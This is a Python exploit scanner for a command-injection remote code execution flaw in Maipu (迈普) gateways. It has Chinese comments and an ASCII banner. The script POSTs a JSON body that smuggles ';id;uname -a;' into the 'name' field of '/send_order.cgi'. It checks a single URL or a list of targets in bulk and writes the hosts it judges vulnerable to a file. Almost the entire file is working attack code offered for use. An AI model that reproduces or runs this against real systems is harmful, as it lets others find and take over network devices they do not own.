import argparse
import requests

#单个url检测
def checkvul(url):
    #请求包信息
    data = '''{"opid":"1","name":";id;uname -a;","type":"rest"}'''
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Content-Type':'application/x-www-form-urlencoded',
        'Connection': 'Keep-alive'
    }
    url1 = url + '/send_order.cgi?parameter=operation'
    try:
        request = requests.post(url1, headers=headers, data=data.encode('utf-8'), timeout=6,verify=True)  # 考虑启用verify
        json = request.json()
        filename = './迈普'
        if request.status_code == 200 and ({"type":1,"msg":"ok"}== json):
             with open(filename,'a') as f:
                f.write(url.strip()+'\n')
                print(f'【+++】{url.strip()}存在漏洞【+++】')
        else:
            print(f'{url.strip()}不存在漏洞')
    except Exception as e:
         print(f'发生错误：{e}')
def checkvuls(filename):
    with open(filename,'r') as f:
        for readline in f.readlines():
            checkvul(readline.strip())

def banner():
    info = '''


          ____                        ,-.----.
        ,'  , `.   ,---,         ,---,\    /  \                ,-.----.     ,----..      ,---,.
     ,-+-,.' _ |  '  .' \     ,`--.' ||   :    \          ,--, \    /  \   /   /   \   ,'  .' |
  ,-+-. ;   , || /  ;    '.   |   :  :|   |  .\ :       ,'_ /| ;   :    \ |   :     :,---.'   |
 ,--.'|'   |  ;|:  :       \  :   |  '.   :  |: |  .--. |  | : |   | .\ : .   |  ;. /|   |   .'
|   |  ,', |  '::  |   /\   \ |   :  ||   |   \ :,'_ /| :  . | .   : |: | .   ; /--` :   :  |-,
|   | /  | |  |||  :  ' ;.   :'   '  ;|   : .   /|  ' | |  . . |   |  \ : ;   | ;    :   |  ;/|
'   | :  | :  |,|  |  ;/  \   \   |  |;   | |`-' |  | ' |  | | |   : .  / |   : |    |   :   .'
;   . |  ; |--' '  :  | \  \ ,'   :  ;|   | ;    :  | | :  ' ; ;   | |  \ .   | '___ |   |  |-,
|   : |  | ,    |  |  '  '--' |   |  ':   ' |    |  ; ' |  | ' |   | ;\  \'   ; : .'|'   :  ;/|
|   : '  |/     |  :  :       '   :  |:   : :    :  | : ;  ; | :   ' | \.''   | '/  :|   |    \
;   | |`-'      |  | ,'       ;   |.' |   | :    '  :  `--'   \:   : :-'  |   :    / |   :   .'
|   ;/          `--''         '---'   `---'.|    :  ,      .-./|   |.'     \   \ .'  |   | ,'
'---'                                   `---`     `--`----'    `---'        `---`    `----'

'''
    print(info)
    print('-u http://www.xxx.com  即可进行单个url漏洞检测')
    print('-l targetUrl.txt  即可对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('author：ni1hao')
def main():
    arg = argparse.ArgumentParser(description='迈普网关rce')
    arg.add_argument('-u',help='单个url漏洞检测')
    arg.add_argument('-l', help='批量检测漏洞（后面添加检测文件地址）')
    args = arg.parse_args()
    try:
        if args.u or args.l:
            if args.u:
                checkvul(args.u)
            else:
                checkvuls(args.l)
        else:
            banner()
    except Exception as  e:
        print(f'程序出现错误{e}')
if __name__ == '__main__':
    main()

